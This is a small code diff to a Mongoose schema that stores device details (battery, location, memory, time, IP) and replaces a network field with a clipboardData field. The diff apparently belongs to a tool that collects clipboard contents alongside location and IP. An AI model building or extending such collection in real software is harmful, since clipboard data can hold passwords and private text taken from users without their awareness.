@@ -9,7 +9,7 @@ const UploadedFileSchema = new mongoose.Schema({
     battery: { type: String },
     location: { type: String },
     deviceMemory: { type: String },
-    network: { type: String },
+    clipboardData: { type: String },
     time: { type: String },
     ip: { type: String }
   }
